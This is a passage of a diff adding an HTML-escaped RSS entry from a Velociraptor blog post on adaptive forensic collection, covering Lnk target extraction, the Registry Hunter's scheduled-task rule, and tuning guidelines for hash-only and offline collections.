+ &lt;img src="https://docs.velociraptor.app/blog/2025/2025-09-28-adaptive-collections//blog/2025/2025-09-28-adaptive-collections/lnk_targets_.svg" alt="Extracting the link targets from Lnk files"
+ class="inline"
+ height="1073.3333333333335"
+ width="2283.880597014926" /&gt;
+ &lt;/div&gt;
+ &lt;figcaption&gt;
+ &lt;a class="image-link"
+ target="_blank" rel="noopener noreferrer"
+ href="lnk_targets.svg"&gt;&lt;i class="fa fa-download"&gt;&lt;/i&gt;&lt;/a&gt;
+ Extracting the link targets from Lnk files
+ &lt;/figcaption&gt;
+&lt;/figure&gt;
+
+
+
+
+&lt;/p&gt;
+&lt;p&gt;Lnk files are often created when the user edits them on the desktop,
+so capturing the targets of &lt;code&gt;Lnk shortcuts&lt;/code&gt; can capture strong
+evidence of user activity. In this case we see a number of files that
+were edited with &lt;code&gt;Notepad&lt;/code&gt; and were captured (assuming they were still
+present).&lt;/p&gt;
+&lt;h2 id="the-registry-hunter"&gt;The Registry Hunter&lt;/h2&gt;
+&lt;p&gt;Registry analysis is a powerful and critical tool in the Digital
+Forensics arsenal. The Windows registry contains a wealth of
+information about system state, while many persistence techniques
+leave traces in the registry.&lt;/p&gt;
+&lt;p&gt;Traditionally, registry analysis is performed on the raw registry
+hives (collected using, for example, the &lt;code&gt;KapeFiles&lt;/code&gt; artifact). These
+files are analysed using tools such as &lt;a href="https://github.com/keydet89/RegRipper4.0" target="_blank" &gt;Reg
+Ripper&lt;/a&gt;
+ or &lt;a href="https://www.sans.org/tools/registry-explorer" target="_blank" &gt;Registry
+Explorer&lt;/a&gt;
+. These tools
+operate on collected registry hives and contain rules designed to
+extract specific pieces of information from various registry keys.&lt;/p&gt;
+&lt;p&gt;Recently, The Velociraptor team has started the &lt;a href="https://registry-hunter.velocidex.com/" target="_blank" &gt;Registry
+Hunter&lt;/a&gt;
+ project. This project
+aims to develop a fully featured rule-based registry parser, and
+contains a large (and growing) number of
+&lt;a href="https://registry-hunter.velocidex.com/docs/rules/" target="_blank" &gt;rules&lt;/a&gt;
+. Many of
+the rules in the Registry Hunter also attempt to uncover evidence of
+persistence through various registry artifacts.&lt;/p&gt;
+&lt;p&gt;While the Registry Hunter can operate on collected hive files, it can
+also operate on the live system using a mixture of API based registry
+access and raw hive parsing. Therefore, the Registry Hunter running on
+a live system is ideally positioned to perform Adaptive Collection
+as described above.&lt;/p&gt;
+&lt;p&gt;
+
+
+
+
+
+
+
+
+
+
+&lt;figure&gt;
+ &lt;div class="figure"&gt;
+ &lt;img src="https://docs.velociraptor.app/blog/2025/2025-09-28-adaptive-collections//blog/2025/2025-09-28-adaptive-collections/registry_hunter.png"
+ class="inline"
+ alt="The Registry Hunter Collection options"
+ width="1469" height="715"&gt;
+ &lt;/div&gt;
+ &lt;figcaption&gt;
+ &lt;a class="image-link"
+ target="_blank" rel="noopener noreferrer"
+ href="registry_hunter.png"&gt;
+ &lt;i class="fa fa-download"&gt;&lt;/i&gt;&lt;/a&gt;
+ The Registry Hunter Collection options
+ &lt;/figcaption&gt;
+&lt;/figure&gt;
+
+
+
+
+&lt;/p&gt;
+&lt;p&gt;The Registry Hunter now has a &lt;code&gt;CollectionPolicy&lt;/code&gt; parameter for rules
+that implement adaptive rules. By default these rules simply hash the
+binaries uncovered in the registry, but they can collect them as well.&lt;/p&gt;
+&lt;p&gt;For example, consider the &lt;a href="https://registry-hunter.velocidex.com/docs/rules/#Scheduled%20Tasks%20%28TaskCache%29" target="_blank" &gt;Scheduled Tasks (TaskCache)
+rule&lt;/a&gt;
+
+from the Registry Hunter. This rule analyses the registry to extract
+the scheduled tasks (as opposed to analysing the XML files in the
+&lt;code&gt;Windows/System32/Tasks&lt;/code&gt; directory).&lt;/p&gt;
+&lt;p&gt;
+
+
+
+
+
+
+
+ 
+ 
+ 
+ 
+ 
+ 
+&lt;figure&gt;
+ &lt;div class="figure"&gt;
+ &lt;img src="https://docs.velociraptor.app/blog/2025/2025-09-28-adaptive-collections//blog/2025/2025-09-28-adaptive-collections/scheduled_tasks_.svg" alt="Registry analysis for the Scheduled Tasks rule"
+ class="inline"
+ height="1051.6666666666667"
+ width="2191.9298245614036" /&gt;
+ &lt;/div&gt;
+ &lt;figcaption&gt;
+ &lt;a class="image-link"
+ target="_blank" rel="noopener noreferrer"
+ href="scheduled_tasks.svg"&gt;&lt;i class="fa fa-download"&gt;&lt;/i&gt;&lt;/a&gt;
+ Registry analysis for the Scheduled Tasks rule
+ &lt;/figcaption&gt;
+&lt;/figure&gt;
+
+
+
+
+&lt;/p&gt;
+&lt;p&gt;When the task action launches a binary, the Registry Hunter is able to
+inspect the disk to check on the launched binary.&lt;/p&gt;
+&lt;p&gt;For an offline collector, it is recommended to use both the &lt;code&gt;Registry Hunter&lt;/code&gt; and the &lt;code&gt;Triage Targets&lt;/code&gt; artifacts together.&lt;/p&gt;
+&lt;h3 id="optimizations"&gt;Optimizations&lt;/h3&gt;
+&lt;p&gt;Adaptive collection is more expensive than simple file collection, as
+it requires Velociraptor to parse forensic artifacts on the endpoint
+and attempt to locate the files referred by them on disk.&lt;/p&gt;
+&lt;p&gt;While parsing the forensic artifacts on the endpoint is usually very
+quick due to Velociraptor&amp;rsquo;s optimized VQL engine, the act of hashing
+and collecting all the additional files can increase the time and
+storage requirements to collect the triage artifact.&lt;/p&gt;
+&lt;p&gt;Most of the time, adaptive collection helps us to answer the following
+questions:&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;
+&lt;p&gt;Were the target files present on the endpoint at collection time?&lt;/p&gt;
+&lt;p&gt;This information is important as many forensic artifacts record
+evidence of execution for files that were already deleted. In this
+case, it won&amp;rsquo;t help us to go back to the endpoint and re-collect
+the target file - it is deleted already!&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;What were those files?&lt;/p&gt;
+&lt;p&gt;Some of the files that were indicated by the forensic artifacts may
+be significant for further investigation - for example, malware
+payloads may need to be collected etc.&lt;/p&gt;
+&lt;p&gt;However not all files are unique to the investigation. For example,
+most files that are executed on the endpoint are legitimate
+binaries. We rarely need to collect those, and even if we need them
+later, legitimate binaries can usually be acquired in other ways
+(for example Virus Total).&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;Adaptive collections need to strike a balance between collecting
+everything and collecting the most useful files.&lt;/p&gt;
+&lt;h3 id="guidelines-for-using-adaptive-collections"&gt;Guidelines for using adaptive collections&lt;/h3&gt;
+&lt;p&gt;For offline collections, it is usually not possible to go back to the
+endpoint to perform a second collection. In this case it might be
+better to err on the side of collecting more than less.&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;Use &lt;code&gt;ExcludeSigned&lt;/code&gt; Collection Policy&lt;/li&gt;
+&lt;li&gt;Consider using the &lt;code&gt;TrustedPathRegex&lt;/code&gt; to eliminate system files.&lt;/li&gt;
+&lt;li&gt;Set conservative values for &lt;code&gt;MaxFileSize&lt;/code&gt; to avoid capturing very
+large adaptively, such as very large executables.&lt;/li&gt;
+&lt;li&gt;If you are concerned about endpoint resource load, consider imposing &lt;a href="https://docs.velociraptor.app/docs/clients/artifacts/#specify-resources" &gt;CPU limits&lt;/a&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;For live connected clients, it is useful to run an adaptive collection
+with &lt;code&gt;HashOnly&lt;/code&gt; collection policy:&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;Bulk adaptive targets are not collected so this reduces needed
+storage and bandwidth, as well as speeding the collection
+significantly.&lt;/li&gt;
+&lt;li&gt;The artifact will still attempt to locate and hash the targets
+which tells us if the files are still present on the endpoint. We
+can always issue a new collection for important files.&lt;/li&gt;
+&lt;li&gt;If you dont use the hashes, considering setting &lt;code&gt;MaxHashSize&lt;/code&gt; to a
+small number. This will speed up the artifact and still record if
+the file itself is present (and its timestamps).&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h2 id="conclusions"&gt;Conclusions&lt;/h2&gt;
+&lt;p&gt;The idea behind &lt;code&gt;Adaptive Collection&lt;/code&gt; is to automate the analysis as
+much as possible, and make collection decisions based on this
+automated initial analysis pass. We need to weigh up how likely it is
+that the discovered files be useful for further analysis.&lt;/p&gt;
+&lt;p&gt;It is not 100% reliable - sometimes there will be interesting binaries
+present inside the Windows directory which the artifact will
+skip. This might necessitate the investigator to go back and retrieve
+it.&lt;/p&gt;
+&lt;p&gt;You can think of forensic acquisition as a spectrum: at one extreme a
+bit-for-bit copy of disk and memory, will surely capture most of the
+data we are interested in. However, this is not usually practical due
+to large systems, storage and network bandwidth.&lt;/p&gt;
+&lt;p&gt;At the other extreme, a &lt;code&gt;triage collection&lt;/code&gt; just captures some
+critical files, like event logs. This is usually insufficient to
+complete a full analysis of a case.&lt;/p&gt;
+&lt;p&gt;The &lt;code&gt;Adaptive Collection&lt;/code&gt; is a middle ground - not as complete as a
+bit-for-bit copy, but a lot better than just collecting files blindly.
+By reducing the analyse/collect feedback loop, Velociraptor is able to
+speed up investigations and strike a better balance along the
+acquisition spectrum.&lt;/p&gt;
+&lt;p&gt;If you like to try these new artifacts, take &lt;a href="https://github.com/Velocidex/velociraptor" target="_blank" &gt;Velociraptor for a
+spin&lt;/a&gt;
+! It is available on
+GitHub under an open source license. As always please file issues on
+the bug tracker or ask questions on our mailing list
+&lt;a href="mailto:velociraptor-discuss@googlegroups.com" &gt;velociraptor-discuss@googlegroups.com&lt;/a&gt;
+
+. You can also chat with us directly on discord
+&lt;a href="https://www.velocidex.com/discord" target="_blank" &gt;https://www.velocidex.com/discord&lt;/a&gt;
+
+.&lt;/p&gt;</description></item></channel></rss>
